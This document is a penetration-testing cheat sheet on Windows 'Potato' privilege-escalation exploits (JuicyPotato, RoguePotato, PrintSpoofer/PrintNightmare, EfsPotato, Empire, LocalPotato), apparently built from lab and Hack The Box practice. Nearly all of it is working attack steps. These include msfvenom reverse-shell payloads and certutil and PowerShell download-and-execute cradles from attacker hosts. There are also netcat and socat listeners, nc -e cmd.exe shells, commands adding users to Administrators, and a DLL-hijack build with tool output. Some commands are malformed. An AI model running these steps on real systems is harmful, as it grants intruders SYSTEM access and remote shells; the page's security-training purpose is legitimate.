# Potato

## Potato

#### JuicyPotato

This is a local privilege escalation tool to exploit Windows service accounts' impersonation privileges. The tool takes advantage of the SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege if enabled on the machine to elevate the local privileges to System.

(Metasploit x86)

{% code overflow="wrap" %}
```bash
# @Kali
msfvenom -p windows/shell_reverse_tcp lhost=192.168.49.137 lport=443 -f exe -o shell.exe

# Download
#https://github.com/ohpe/juicy-potato/releases/tag/v0.1 
#https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts 

# @ Windows box
certutil -urlcache -split -f "http://192.168.142.155/shell.exe" shell.exe
certutil -urlcache -split -f "http://192.168.142.155/Juicy.Potato.x86.exe " Juicy.Potato.x86.exe 

# @Kali 
nc -nlvp 443

# @Windows box
>Juicy.Potato.x86.exe  -l 1337 -p C:\Users\Public\Documents\shell.exe -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}

# -l: Any Port (currently 1337) 
# -p: an executable to be escalated (full path)
# -t: *
# -c: CLSID number (https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise/)
```
{% endcode %}

(PsExec)

{% code overflow="wrap" %}
```bash
# This is an exploit before Windows 10 1809 and it actually worked in Windows 7, 8, and 2008 R2. 

# Assume that you has a reverse shell with a user privilege. 

1. Run command below and find "SeImpersonate" or "SeAssignPrimaryToken". 

    # @Windows 7 box (via reverse shell)
    Whoami /priv

2. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows. 

    # @Kali 
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.155 LPORT=53 -f exe -o reverse.exe

    # @Kali
    sudo python3 -m http.server

    # @Windows 7 box (via previous PE reverse shell)
    >certutil -urlcache -split -f "http://192.168.142.155/reverse.exe" reverse.exe

    https://learn.microsoft.com/en-us/sysinternals/downloads/psexec 
    https://github.com/ohpe/juicy-potato/releases/tag/v0.1 
    https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts 

3. Use PSExec64.exe to trigger a reverse shell running as the Local Service service account 

    # @Windows 7 box (via previous PE reverse shell)
   >PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

    # @Windows 7 box (via previous PE reverse shell)
    whoami
    
    # Should be local service

4.Start another listener on Kali. 

    # @Kali 
    nc -nlvp 53

5. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges. 

    # @Windows 7 box (via PsExec reverse shell)

   >JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

    # Pick any CLSID you want. Here you can find the list organized by OS.
    # https://ohpe.it/juicy-potato/CLSID/ 

    # Or run a GetCLSID.ps1 script in the site below. 
    # https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

    # Good reference
    # https://ohpe.it/juicy-potato/ 

```
{% endcode %}

(Powershell)

```bash
1. Download JuicyPotato.exe 

    # @Windows box (via reverse shell)
    PS>(new-object net.webclient).downloadfile('http://10.10.14.2/JuicyPotato.exe', 'C:\Users\Public\Downloads\jp.exe')

2. Prepare a PowerShell reverse shell 

    # @Kali 
    cp /opt/win/nishang/Shells/Invoke-PowerShellTcp.ps1 .
    mv Invoke-PowerShellTcp.ps1 shell.ps1

    # At the end of the powershell code, add the following: 
    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 1235

3. Create a shell.bat that contains the following code. 

    # @Kali 
    echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/shell.ps1')" > shell.bat 

4. Create a listener on port 1235

    # @Kali 
    nc -nlvp 1235 

5. Download the shell.bat

    # @Windows box (via reverse shell)
    PS>(new-object net.webclient).downloadfile('http://10.10.14.2/shell.bat', 'C:\Users\Public\Downloads\shell.bat')

6. Run the JuicyPotato Command

    # Windows 8 or 2008 R2
    PS>./jp.exe -t * -p shell.bat -l 4444
    # Windows 10 15063
    PS>./jp.exe -l 1337 -p shell.bat -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

#### RoguePotato

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer, RoguePotato, SharpEfsPotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access.

```bash
GitHub: https://github.com/antonioCoco/RoguePotato
Blog: https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/ 
Pre-compliend: https://github.com/lochus/roguepotato
Hack the box: Remote

1. Establish socat and netcat listeners 

    # @Kali - Use Windows IP address
    socat tcp-listen:135,reuseaddr,fork tcp:192.168.142.156:9999

    # @Kali
    nc -nlvp 53

2. Run PSexec for Reverse Shell

    # @Windows 10 (Via previous reverse shell, ssh, or remote desktop connection)
    C:\PrivEsc\PSExec64.exe -accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

    # Now you have a connection to port 53

    # @Windows 10 (via Kali Reverse shell)
    whoami /priv

3. Run another netcat listener 

    # @Kali 
    nc -nlvp 53

4. Run the exploit

    # @Windows 10 (Via previous reverse shell, ssh, or remote desktop connection)
    C:\PrivEsc\RoguePotato.exe -r 192.168.142.159 -l 9999 -e "C:\PrivEsc\reverse.exe"

    # @Kali 
    # Check a reverse shell connection

Another way (Local Administrator Group)

1. Establish socat listener

    #@ Kali - Use Windows IP address
    sudo socat tcp-listen:135,reuseaddr,fork tcp:172.16.1.102:9999

    #@WIndows 10 (via previous reverse shell)
    RoguePotato.exe -r 10.10.14.228 -l 9999 -e "net localgroup Administrators iptracej /add" 


Another way (netcat based reverse connection)

    #@ Kali - Use Windows IP address
    sudo socat tcp-listen:135,reuseaddr,fork tcp:172.16.1.102:9999

    #@ Kali 
    nc -nlvp 1234

    #@WIndows 10 (via previous reverse shell)
    RoguePotato.exe -r 10.10.14.228 -l 9999 -e "nc64.exe 10.10.10.10" 1234 -e cmd.exe" -l 9999


```

#### PrintSpoofer

CVE-2021-1675

```bash
1. Download the exploit

    https://github.com/dievus/printspoofer (exe)
    
2. Run the exploit

    # @Windows
    > PrintSpoofer.exe -i -c cmd 
```

or

```bash
1. Download the exploit

    # @Windows 
    https://github.com/calebstewart/CVE-2021-1675

2. Execute the exploit 

    # @Windows
    Import-Module .\CVE-2021-1675.ps1
    Invoke-Nightmare

#[+] using default new user: adm1n
#[+] using default new password: P@ssw0rd
#[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
#[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.#inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
#[+] added user as local administrator
#[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll

3. RunAs as a new local Administrator

    # @Windows - This will pop up another window.
    cd C:\Windows\System32
    Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n

```

#### SweetPotato

Sweet Potato is a collection of various native Windows privilege escalation techniques from service accounts to SYSTEM. (C# exe)

```bash
0. Download & Build 

    # @Windows (if you have internet connection)
    PS> wget https://raw.githubusercontent.com/zcgonvh/EfsPotato/master/EfsPotato.cs -OUTFILE EfsPotato.cs
    PS> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe EfsPotato.cs

    # upload the exe to /opt/shell/sweetpotato/EfsPotato.exe

1. Transfer exploit

    # @Kali
    cp /opt/shell/sweetpotato/EfsPotato.exe .
    sudo python3 -m http.server

    # @Windows
    certutil -urlcache -split -f http://x.x.x.x/EfsPotato.exe 

2. Run the exploit

    # @Windows
    .\EfsPotato.exe whoami
```

(Empire Powershell)

```bash
0. If you are not set up yet, run the following command:

    # @Kali
    sudo apt install powershell-empire

1. Start Powershell-empire server and client

    # @Kali
    >sudo powershell-empire server 

    # @Kali (another console)
    >sudo powershell-empire client 

2. Set listener and create a shell 

    # @Kali
    >uselistner http
    >set Port 1234
    >execute
    >usestager windows/launcher_bat
    >set Listener http
    >execute

    sudo mv /var/lib/powershell-empire/empire/client/generated-stagers/launcher.bat .
    sudo python3 -m http.server 80

3. Execute 

    # @Windows
    .\launcher.bat

4. Interact with Agent

    # @Windows
    >agents 
    >usemodule powershell/privesc/sweetpotato
    >execute



```

#### GenericPotato

Generic Potato is a modified version of SweetPotato to support impersonating authentication over HTTP and/or named pipes. There must be a way to force a high-privileged process to do outbound http request (SSRF) or perform arbitrary filesystem read/wring (open/save file).

```bash

https://github.com/micahvandeusen/GenericPotato
https://github.com/JimKwikX/GenericPotato (Pre-compiled)
https://github.com/int0x33/nc.exe/raw/master/nc64.exe 

This is a bit tricky since you would need SSRF bug. 

# Rerefence
# https://jim-solomonx.medium.com/hackthebox-cereal-writeup-d1bf6133121f 

```

#### LocalPotato

{% code overflow="wrap" %}
```bash

    # Windows 2019 
    >systeminfo
     #10.0.17763 N/A Build 17763 

1. Get localPotato source code and LPE via StorSvc

    > wget https://github.com/decoder-it/LocalPotato/releases/download/v1.0/LocalPotato.zip
    > git clone https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc


2. Download and install MS build

    https://aka.ms/vs/17/release/vs_BuildTools.exe

3. Change the target machine in storsvc_c.c 

    Go to ..\LPE via StorSvc\RpcClient\RpcClient\storsvc_c.c and update the target. This case, Windows 2019.

    #if defined(_M_AMD64)

    //#define WIN10
    //#define WIN11
    #define WIN2019
    //#define WIN2022

4. Build the exe 

    Go to directory ..\LPE via StorSvc\RpcClient\RpcClient.vcxproj

    >BUILD 
    # Build succeeded. 

    >move x64\Debug\RpcClient.exe C:\Users\user\Desktop\ 

5. Update the command in CreateProcess in main.c below

    Go to LocalPotato\LPE via StorSvc\SprintCSP\SprintCSP\main.c, and update the CreateProcess to

        CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators <user name> /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

        # You can run a metasploit based reverse shell. 

        # @Kali 
        # msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=53 -f exe -o reverse.exe

        # CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C .\reverse.exe",NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

6. Build dll

    # @Windows box 

    Go to directory ..\LPE via StorSvc\SprintCSP\

    >BUILD
    # Build succeeded. 

    >move x64\Debug\SprintCSP.dll C:\Users\user\Desktop\  

7. Check your membership 

    # @Windows box 

    >net user <user name>

8. Run LocalPotato

    # @Windows box 

    >.\LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
    #[*] Objref Moniker Display Name = objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGAQAAAAAAAABTIvXDdMIUbap+AepkeJ/yAcgAAMwIwArWEKZ3vRDmhjkAIwAHAEMASABBAE4ARwBFAC0ATQBZAC0ASABPAFMAVABOAEEATQBFAAAABwAxADAALgAxADAALgA0ADAALgAyADMAMQAAAAAACQD//wAAHgD//wAAEAD//wAACgD//wAAFgD//wAAHwD//wAADgD//wAAAAA=:
    #[*] Calling CoGetInstanceFromIStorage with CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
    #[*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes
    #[*] Received DCOM NTLM type 1 authentication from the privileged client
    #[*] Connected to the SMB server with ip 127.0.0.1 and port 445
    #[+] SMB Client Auth Context swapped with SYSTEM
    #[+] RPC Server Auth Context swapped with the Current User
    #[*] Received DCOM NTLM type 3 authentication from the privileged client
    #[+] SMB reflected DCOM authentication succeeded!
    #[+] SMB Connect Tree: \\127.0.0.1\c$  success
    #[+] SMB Create Request File: Windows\System32\SprintCSP.dll success
    #[+] SMB Write Request file: Windows\System32\SprintCSP.dll success
    #[+] SMB Close File success
    #[+] SMB Tree Disconnect success

9. Run Privilege Escalation 

    # @Windows box 

    >.\RpcClient.exe
    # [+] Dll hijack triggered!

10. Check 

    net user <user name>
    # Local Group Memberships      *Administrators ! 
```
{% endcode %}
